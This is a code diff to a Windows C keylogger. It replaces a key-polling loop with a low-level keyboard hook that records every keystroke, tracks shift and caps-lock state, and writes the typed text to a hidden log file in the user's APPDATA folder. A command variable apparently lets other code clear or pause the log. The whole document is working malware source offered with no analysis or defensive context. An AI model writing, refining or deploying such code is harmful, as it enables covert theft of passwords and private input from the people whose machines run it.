@@ -1,14 +1,111 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
+#include "keylogger.h"
+#include "types.h"
+
+char* key_withShift = ")!@#$%^&*(";
+int keylogger_isCapsOn = 0;
+int keylogger_isShiftOn = 0;
 
 int keylogger_cmd = 0;
 int keylogger_thread = 0;
-int klog_caps = 0;
 char* keylogger_path;
 FILE *flog;
 
-DWORD keylogger_func()
+LRESULT CALLBACK keyb_hook(int nCode, WPARAM wParam, LPARAM lParam)
+{
+     int normalPrint = 0;
+     int specialKey = 0;
+     uint8 pkey = KEY_EMPTY;
+     KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
+
+     if(keylogger_cmd != 0)
+     {
+          return CallNextHookEx(NULL, nCode, wParam, lParam);
+     }
+
+     if(wParam == WM_KEYUP)
+     {
+          pkey = (uint8)pKeyBoard->vkCode;
+          
+          if(pkey == KEY_CAPS)
+          {
+               keylogger_isCapsOn = !keylogger_isCapsOn;
+               specialKey = 1;
+          }
+
+          if(pkey == KEY_SHIFT)
+          {
+               keylogger_isShiftOn = 0;
+               specialKey = 1;
+          }
+
+          if(!specialKey)
+          {
+               if(pkey >= 'A' && pkey <= 'Z')
+               {
+                    if(keylogger_isCapsOn && keylogger_isShiftOn)
+                    {
+                         pkey += 0x20;
+                    }else if(!keylogger_isCapsOn && !keylogger_isShiftOn){
+                         pkey += 0x20;
+                    }
+
+                    normalPrint = 1;
+               }
+
+               if(keylogger_isShiftOn && pkey >= '0' && pkey <= '9')
+               {
+                    pkey = key_withShift[pkey - '0'];
+                    normalPrint = 1;
+               }
+          }
+
+          if(normalPrint || pkey == KEY_TAP || pkey == KEY_ENTER || pkey == KEY_SPACE || pkey == KEY_BACKSPACE)
+          {
+               fputc(pkey, flog);
+          }else{
+               fputc(keylogger_isShiftOn, flog);
+               fputc(pkey, flog);
+          }
+
+          fflush(flog);
+     }else if(wParam == WM_KEYDOWN){
+          pkey = (uint8)pKeyBoard->vkCode;
+          
+          if(pkey == KEY_SHIFT)
+          {
+               keylogger_isShiftOn = 1;
+          }
+     }
+
+     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+int keylogger_func(void* args)
+{
+     MSG msg;
+     HINSTANCE instc = GetModuleHandle(NULL);
+     HHOOK hk = SetWindowsHookEx(WH_KEYBOARD_LL, keyb_hook, instc, 0);
+
+     while(!GetMessage(&msg, NULL, NULL, NULL))
+     {
+          if(keylogger_cmd == 0x1)
+          {
+               fclose(flog);
+               flog = fopen(keylogger_path, "w");
+               keylogger_cmd = 0x0;
+          }else if(keylogger_cmd == 0x2){
+               continue;
+          }
+
+          TranslateMessage(&msg);
+          DispatchMessage(&msg);
+     }
+}
+
+void keylogger_Start(void)
 {
      int i;
      char* appdata_path = getenv("APPDATA");
@@ -26,77 +123,12 @@ DWORD keylogger_func()
      fseek(flog, 0, SEEK_SET);
      free(appdata_path);
 
-     while(keylogger_thread)
+     if((GetKeyState(KEY_CAPS) & 0x0001)!=0)
      {
-          Sleep(10);
-          fflush(flog);
-
-          if(keylogger_cmd == 0x1)
-          {
-               fclose(flog);
-               flog = fopen(keylogger_path, "w");
-               keylogger_cmd = 0x0;
-          }else if(keylogger_cmd == 0x2){
-               continue;
-          }
-
-          for(i = 0x30; i <= 0x69; i++)
-          {
-               if(GetAsyncKeyState(i) & 0xFF)
-               {
-                    if(i >= 0x30 && i <= 0x39) //0-9
-                    {
-                         fputc(i, flog);
-                         break;
-                    }
-
-                    if(i >= 0x41 && i <= 0x5A) //A-Z
-                    {
-                         if(GetKeyState(VK_CAPITAL) == 0)
-                         {
-                              i += 0x20;
-                         }
-
-                         fputc(i, flog);
-                         break;
-                    }
-
-                    if(i >= 0x60 && i <= 0x69) // num 0 - 9
-                    {
-                         fputc(i, flog);
-                         break;
-                    }
-               }
-          }
-
-          if(GetAsyncKeyState(VK_RETURN) & 0xFF)
-          {
-               fprintf(flog, "[ENTER]");
-          }else if(GetAsyncKeyState(VK_SPACE) & 0xFF){
-               fprintf(flog, "[SPACE]");
-          }else if(GetAsyncKeyState(VK_LEFT) & 0xFF){
-               fprintf(flog, "[LEFT]");
-          }else if(GetAsyncKeyState(VK_RIGHT) & 0xFF){
-               fprintf(flog, "[RIGHT]");
-          }else if(GetAsyncKeyState(VK_BACK) & 0xFF){
-               fprintf(flog, "[BACKSPACE]");
-          }else if(GetAsyncKeyState(VK_TAB) & 0xFF){
-               fprintf(flog, "[TAB]");
-          }
+          keylogger_isCapsOn = 1;
      }
 
-     fclose(flog);
-     free(keylogger_path);
-}
-
-void keylogger_Start(void)
-{
+     keylogger_cmd = 0;
      keylogger_thread = 1;
-     DWORD thread_id;
-     CreateThread(NULL, 0, keylogger_func, NULL, 0, &thread_id);
-}
-
-void keylogger_Stop(void)
-{
-     keylogger_thread = 0;
+     CreateThread(NULL, 0, keylogger_func, NULL, 0, NULL);
 }
